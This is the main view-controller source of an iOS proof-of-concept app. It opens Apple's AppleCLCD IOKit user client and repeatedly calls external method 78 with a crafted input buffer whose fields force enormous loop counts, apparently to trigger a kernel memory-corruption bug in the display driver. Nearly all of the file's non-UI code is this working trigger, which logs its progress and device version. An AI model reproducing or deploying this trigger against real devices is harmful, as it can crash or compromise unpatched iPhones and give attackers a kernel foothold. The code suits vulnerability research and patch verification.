//
//  ViewController.m
//  poc14.7.1
//
//  Created by rA9 on 11.10.2021.
//

#import <Foundation/Foundation.h>
#import "ViewController.h"
#import "poc.h"
#import <sys/utsname.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include <pthread.h>
#include "iokit.h"

@interface ViewController ()

@end

UIColor *color;

bool firstline = 1;

NSString* deviceName(void) {
    
    struct utsname systemInfo;
    uname(&systemInfo);
    
    return [NSString stringWithCString:systemInfo.machine
                                  encoding:NSUTF8StringEncoding];
    }

@implementation ViewController

- (void)updateStatus:(NSString*)text color:(UIColor*)color1 {
    
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *logtext = NULL;

        if (firstline) {
            logtext = @"[*] ";
            firstline = false;
        }
        else if (!firstline) {
            logtext = @"\n ";
        }
        
        logtext = [logtext stringByAppendingString:text];
        UIColor *color = color1;
        UIFont *font;
        if (@available(iOS 13.0, *)) {
            font = [UIFont monospacedSystemFontOfSize:0 weight: UIFontWeightRegular];
            
        } else {
            font = [UIFont fontWithName:@"Helvetica Neue" size:13.37];
        }
        NSDictionary *attrs = @{ NSForegroundColorAttributeName : color, NSFontAttributeName : font};
        NSAttributedString *attrStr = [[NSAttributedString alloc] initWithString:logtext attributes:attrs];
        [[self -> _logview textStorage] appendAttributedString:attrStr];
        
        [self -> _logview scrollRangeToVisible:NSMakeRange([[self -> _logview text] length], 0)];
        
    });
}

- (io_connect_t) get_iomfb_uc {
    
    kern_return_t ret;
    io_connect_t shared_user_client_conn = MACH_PORT_NULL;
    int type = 0;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("AppleCLCD"));
    
    if(service == MACH_PORT_NULL) {
        
        [self updateStatus:@"[-] failed to open service\n" color:[UIColor whiteColor]];
        return MACH_PORT_NULL;
    }
    
    [self updateStatus:[NSString stringWithFormat:@"[*] AppleCLCD service: 0x%x\n", service] color:[UIColor whiteColor]];

    ret = IOServiceOpen(service, mach_task_self(), type, &shared_user_client_conn);
    if(ret != KERN_SUCCESS) {
        [self updateStatus:@"[-] failed to open userclient: %s\n" color:[UIColor whiteColor]];
        return MACH_PORT_NULL;
    }
    [self updateStatus:[NSString stringWithFormat:@"AppleCLCD userclient: 0x%x\n", shared_user_client_conn] color:[UIColor whiteColor]];

    return shared_user_client_conn;
}


- (int) do_trigger:(io_connect_t)iomfb_uc {
    kern_return_t ret = KERN_SUCCESS;
    size_t input_size = 0x180;
    
    uint64_t scalars[2] = { 0 };

    char *input = (char*)malloc(input_size);
    if (input == NULL) {
        perror("malloc input");
        return -1;
    }
    
    memset(input, 0x41, input_size);
    int *pArr = (int*)input;

    pArr[0] = 0x3;          // sub-sub selector
    pArr[1] = 0xffffffff;   // has to be non-zero
    pArr[2] = 0x40000001;   // #iterations in the outer loop (new_from_data)
    pArr[3] = 2;
    pArr[8] = 2;
    pArr[89] = 4;           // #iterations in the inner loop (set_table)
    
    /* each call trigger a flow with a lot of calls to set_table(), while
       each set_table() flow will do a loop of only 4 iterations*/
    for (size_t i = 0; i < 0x10000; ++i) {
        ret = IOConnectCallMethod(iomfb_uc, 78,
                            scalars, 2,
                            input, input_size,
                            NULL, NULL,
                            NULL, NULL);
    }

    if (ret != KERN_SUCCESS) {

        [self updateStatus:[NSString stringWithFormat:@"s_set_block failed, ret == 0x%x --> %s\n", ret, mach_error_string(ret)] color:[UIColor whiteColor]];
        free(input);
        return -1;
    } else {
        [self updateStatus:@"success!" color:[UIColor whiteColor]];
        free(input);
        return 0;
    }
    
    return 0;
}

- (int) poc {
    io_connect_t iomfb_uc = [self get_iomfb_uc];
    if (iomfb_uc == MACH_PORT_NULL) {
       return -1;
    }
    
    if ([self do_trigger:iomfb_uc] != 0) {
        return -1;
    }
    
    // we don't reach here, but for completness
    IOServiceClose(iomfb_uc);
    
    return 0;
}


- (IBAction)runPOC:(id)sender {

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        dispatch_async(dispatch_get_main_queue(), ^{
            
            [self -> _runButton setTitle:@"running" forState:UIControlStateNormal];
            [self poc];
            [self -> _runButton setTitle:@"done" forState:UIControlStateNormal];

        });
    });
}


- (void)viewDidLoad {
    [super viewDidLoad];
    
    NSString *version = [[UIDevice currentDevice] systemVersion];
    NSString *devname = deviceName();
    [self updateStatus:[NSString stringWithFormat:@"Running on %@ on version %@", devname, version] color:[UIColor whiteColor]];
    // Do any additional setup after loading the view.
}


@end
